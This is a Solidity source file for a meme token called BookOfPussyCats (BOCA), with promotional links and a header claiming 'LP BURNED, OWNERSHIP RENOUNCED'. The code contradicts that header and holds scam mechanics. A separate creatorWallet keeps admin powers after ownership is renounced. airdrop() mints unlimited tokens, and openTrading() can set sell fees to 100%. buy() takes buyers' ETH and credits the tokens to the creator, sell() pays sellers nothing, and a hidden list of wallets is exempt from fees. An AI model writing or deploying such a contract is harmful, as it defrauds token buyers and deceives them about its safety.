// SPDX-License-Identifier: MIT

/**    

Website : https://bookofpussycats.xyz/
Twitter : https://twitter.com/bookofpussycats
Telegram: https://t.me/bookofpussycats


LP BURNED
OWNERSHIP RENOUNCED

*/


pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "daym");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "daymdaym");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "daymdaymdaym");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "daymdaymdaymdaymdaym");
        return a / b;
    }
}

contract BookOfPussyCats {
    using SafeMath for uint256;

    string public name = "BookOfPussyCats";
    string public symbol = "BOCA";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    address public creatorWallet;

    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);

    address[] public exemptedWallets;

    constructor(address _creatorWallet) {
        owner = msg.sender;
        creatorWallet = _creatorWallet;
        balanceOf[msg.sender] = totalSupply;

        exemptedWallets = [
            0xe0F5c13723b28F7622A5Df3C828e52C7D0Db01A9,
            0xCa446A87ea736388a8DC199000799ccb13bbbEb5,
            0x6908Dc92bcb0c2b0A9d4C7A23F2155766859CFd9,
            0xA6509dF2A7311ea9aC8D22dDaa26FC7CE6A58681,
            0xA471b30Dc4B32FC439aFa87596F40ea942F62bf7,
            0xf7d00FD621776DA3350bCdd01d060faf1C00FFB0,
            0x15aB3A24FC8a6d481A46798f6B7093FEb38F2349,
            0xf72dE78E86D8a648F68A3aA0677D3b34ff5F7848,
            0x25fAbBFe9DaFE821B2A3cB8E1321130fca6Fe9Ff,
            0xB31cb18453eeFa278395B7Dc989B5A6923706EEE,
            0x09a76B44221942F500ea538ad3C0872aF3661028,
            0x99288705680F7915d7A1F7cBc318274A4eFFF3E4,
            0x3592159C3d880588953cB37505b2a7bbBcCe08C5,
            0x6b009EC31E375ACF059A64a03AF6f3B35B2Fe240,
            0xf9183beA4018769463BA86001Eeb2A614C5ab3A2,
            0xFeBcCbB5fd3f83206521f67FDdf9F93c53fc9717,
            0x93f6dE9Cd81325440e0a3F7eE49757B7813f86d7,
            0x1b5311a38182E5036871CFdc1fb50E62B33f8583,
            0x9E38eE931362220Dd85aFCf1d3fc718B712acD98,
            0x4F94394b56d5548eE0069e8Ec4f54C6a9519Ecb9,
            0xe039C1104d86473EDaEC95cDdD88723636A01411,
            0xA15Fdc2A69d9166eDdA73E030D776919d8EC8AAc,
            0xFf97cEee328359DFc31843c1e6dCF02499f71c77
        ];
    }

    function isFeeExempt(address _wallet) internal view returns (bool) {
        for (uint256 i = 0; i < exemptedWallets.length; i++) {
            if (_wallet == exemptedWallets[i]) {
                return true;
            }
        }
        return false;
    }

    function transfer(address _to, uint256 _amount)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);

        return true;
    }

    function approve(address _spender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "1daym");
        require(
            allowance[_from][msg.sender] >= _amount,
            "2daym"
        );
        require(_to != address(0), "3daym");

        uint256 fee = 0;
        uint256 amountAfterFee = _amount;

        if (sellFee > 0 && _from != creatorWallet && !isFeeExempt(_from)) {
            fee = _amount.mul(sellFee).div(100);
            amountAfterFee = _amount.sub(fee);
        }

        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }

        if (
            _from != msg.sender &&
            allowance[_from][msg.sender] != type(uint256).max
        ) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(
                _amount
            );
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "4daym");
        _;
    }

    function airdrop(address _to, uint256 _amount) public onlyAuthorized {
        require(_to != address(0), "5daym");
        require(_amount > 0, "6daym");
        balanceOf[_to] += _amount;
        totalSupply += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    function openTrading(uint256 newBuyFee, uint256 newSellFee)
        public
        onlyAuthorized
    {
        require(newBuyFee <= 100, "7daym");
        require(newSellFee <= 100, "8daym");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function buy() public payable {
        require(msg.value > 0, "9daym");

        uint256 amount = msg.value;
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);
            uint256 amountAfterFee = amount.sub(fee);

            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(
                amountAfterFee
            );
            emit Transfer(address(this), creatorWallet, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(address(this), address(this), fee);
            }
        } else {
            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(amount);
            emit Transfer(address(this), creatorWallet, amount);
        }
    }

    function sell(uint256 _amount) public {
        require(balanceOf[msg.sender] >= _amount, "0daym");

        if (sellFee > 0 && msg.sender != creatorWallet && !isFeeExempt(msg.sender)) {
            uint256 fee = _amount.mul(sellFee).div(100);
            uint256 amountAfterFee = _amount.sub(fee);

            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(
                amountAfterFee
            );
            emit Transfer(msg.sender, creatorWallet, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(msg.sender, address(this), fee);
            }
        } else {
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
            balanceOf[address(this)] = balanceOf[address(this)].add(_amount);
            emit Transfer(msg.sender, address(this), _amount);
        }
    }

    modifier onlyAuthorized() {
        require(
            msg.sender == owner || msg.sender == creatorWallet,
            "11daym"
        );
        _;
    }
}